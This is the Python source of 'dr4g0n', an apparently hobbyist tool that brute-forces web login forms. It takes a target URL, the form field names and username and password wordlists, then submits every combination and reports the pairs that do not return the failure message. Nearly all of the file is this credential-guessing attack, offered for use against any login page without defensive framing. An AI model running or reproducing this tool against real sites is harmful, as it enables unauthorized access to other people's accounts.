import os, requests

class colors:
   RED = "\033[1;31m"
   BLUE  = "\033[1;34m"
   CYAN  = "\033[1;36m"
   GREEN = "\033[0;32m"
   RESET = "\033[0;0m"
   BOLD    = "\033[;1m"
   REVERSE = "\033[;7m"

def main():
   os.system("clear")
   badge = open(curdir + "/badge1.txt","r")
   print(colors.BOLD + colors.RED + badge.read() + colors.RESET)
   print(colors.BOLD + colors.CYAN + "                                       ======================" + colors.RESET)
   print(colors.BOLD + colors.CYAN + "                                       | Welcome to dr4g0n. | " + colors.RESET)
   print(colors.BOLD + colors.CYAN + "                                       ======================\n" + colors.RESET)
   print(colors.BOLD + colors.GREEN + "                                       Made by Ryder Gibson" + colors.RESET)
   print(colors.BOLD + colors.BLUE + "                                       https://bit.ly/dragon_github" + colors.RESET)
   print(colors.BOLD + "                                       v" + localvertext + "\n" + colors.RESET)
   target = input(colors.BOLD + "                                       Target (ex. http://192.168.1.34/login.php): " + colors.RESET)
   username = input(colors.BOLD + "                                       Username form input element: " + colors.RESET)
   password = input(colors.BOLD + "                                       Password form input element: " + colors.RESET)
   fail = input(colors.BOLD + "                                       Invalid login message (no quotes): " + colors.RESET)
   userfile = input(colors.BOLD + "                                       Username file (Provide full path): " + colors.RESET)
   passfile = input(colors.BOLD + "                                       Password file (Provide full path): " + colors.RESET)
   formtype = input(colors.BOLD + "                                       Form type (GET or POST, no caps): " + colors.RESET)
   crack(target,username,password,fail,userfile,passfile,formtype)

def update():
   os.system("clear")
   print("Program is outdated -- current version is " + localvertext + ", newest version is " + remotevertext)

def crack(target,username,password,fail,userfile,passfile,formtype):
   useri = 0
   passi = 0
   usernames = open(userfile,"r")
   passwords = open(passfile,"r")
   userline = usernames.readline()
   passline = passwords.readline()
   validlogins = []
   with usernames as user:
      for userlines, l in enumerate(user):
         userlines = userlines + 1
         pass
   userlines = userlines + 1
   with passwords as passw:
      for passlines, l in enumerate(passw):
         passlines = passlines + 1
         pass
   passlines = passlines + 1
   print(colors.BOLD + "\n                                       " + str(userlines) + " usernames and " + str(passlines) + " passwords will be used for a total of " + str(userlines * passlines) + " logins.\n" + colors.RESET)
   usernames.close()
   passwords.close()
   usernames = open(userfile,"r")
   passwords = open(passfile,"r")
   while useri < userlines:
      userline = usernames.readline()
      userline = userline.replace("\r","")
      userline = userline.replace("\n","")
      passi = 0
      while passi < passlines:
         passline = passwords.readline()
         passline = passline.replace("\r","")
         passline = passline.replace("\n","")
         data = {
            username: userline,
            password: passline
            }
         if formtype == "post":
            request = requests.post(target, data)
            formmsg = request.text
         else:
            request = requests.get(target, data)
            formmsg = request.text
         if formmsg == fail:
            print(colors.BOLD + colors.RED + "                                       " + userline + " :: " + passline + " ----- " + formmsg + colors.RESET)
         else:
            print(colors.BOLD + colors.GREEN + "                                       " + userline + " :: " + passline + " ----- " + formmsg + colors.RESET)
            validlogins.append(userline + " :: " + passline)
         passi += 1
      passwords.close()
      passwords = open(passfile,"r")
      useri += 1
   loginsi = 0
   print("\n\n" + colors.BOLD + "                                       Valid logins:\n" + colors.RESET)
   while loginsi < len(validlogins):
      print(colors.BOLD + colors.GREEN + "                                       " + validlogins[loginsi] + colors.RESET)
      loginsi += 1
   print("\n" + colors.BOLD + "                                       Thank you for using my tool. I hope I helped." + colors.RESET)

os.system("clear")

curdir = os.getcwd()
verfile = curdir + "/version.conf"
localver = open(verfile, "r")
remotever = requests.get("https://raw.githubusercontent.com/rydergibson/dr4g0n/master/version.conf")
status = remotever.status_code
remotevertext = remotever.text
localvertext = localver.read()
remotevertext = remotevertext.replace("\r","")
remotevertext = remotevertext.replace("\n","")
localvertext = localvertext.replace("\r","")
localvertext = localvertext.replace("\n","")

print("Checking for updates...")

if status is not 200:
   print("There was an error while attempting to check for an update; updates will be skipped")
else:
   if localvertext == remotevertext:
      main()
   else:
      update()